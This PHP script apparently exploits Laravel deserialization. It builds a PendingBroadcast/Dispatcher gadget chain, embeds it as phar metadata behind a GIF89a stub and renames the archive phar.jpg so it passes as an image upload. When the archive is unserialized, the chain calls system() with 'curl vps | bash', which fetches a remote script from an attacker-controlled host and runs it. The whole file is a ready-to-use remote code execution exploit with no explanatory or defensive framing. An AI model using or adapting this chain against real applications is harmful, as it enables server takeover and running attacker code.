<?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this->connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this->queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('curl vps | bash');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($PendingBroadcast);
    $phar -> stopBuffering();
    rename('phar.phar','phar.jpg');

}

